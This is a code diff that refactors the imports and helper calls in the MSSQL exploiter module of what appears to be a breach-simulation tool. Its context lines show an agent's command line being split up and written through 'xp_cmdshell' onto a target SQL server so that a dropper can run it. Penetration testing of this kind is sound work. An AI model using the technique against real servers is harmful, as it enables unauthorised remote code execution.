+++ monkey/infection_monkey/exploit/mssqlexec.py
@@ -6,9 +6,10 @@ from time import sleep
 import pymssql
 
 from common.utils.exploit_enum import ExploitType
-from infection_monkey.exploit import HostExploiter, tools
-from infection_monkey.exploit.tools import HTTPTools
-from infection_monkey.exploit.tools import get_monkey_dest_path
+from infection_monkey.exploit import HostExploiter
+from infection_monkey.exploit.tools.http_tools import HTTPTools
+from infection_monkey.exploit.tools.helpers import get_monkey_dest_path, get_target_monkey, \
+    build_monkey_commandline, get_monkey_depth
 from infection_monkey.model import DROPPER_ARG
 from infection_monkey.utils import get_monkey_dir_path
 
@@ -40,7 +41,7 @@ class MSSQLExploiter(HostExploiter):
             return False
 
         # Get monkey exe for host and it's path
-        src_path = tools.get_target_monkey(self.host)
+        src_path = get_target_monkey(self.host)
         if not src_path:
             LOG.info("Can't find suitable monkey executable for host %r", self.host)
             return False
@@ -68,9 +69,9 @@ class MSSQLExploiter(HostExploiter):
         MSSQLExploiter.run_file(cursor, tmp_file_path)
         self.add_executed_cmd(' '.join(commands))
         # Form monkey's command in a file
-        monkey_args = tools.build_monkey_commandline(self.host,
-                                                     tools.get_monkey_depth() - 1,
-                                                     dst_path)
+        monkey_args = build_monkey_commandline(self.host,
+                                               get_monkey_depth() - 1,
+                                               dst_path)
         monkey_args = ["xp_cmdshell \"<nul set /p=%s >>%s\"" % (part, tmp_file_path)
                        for part in textwrap.wrap(monkey_args, 40)]
         commands = ["xp_cmdshell \"<nul set /p=%s %s >%s\"" % (dst_path, DROPPER_ARG, tmp_file_path)]
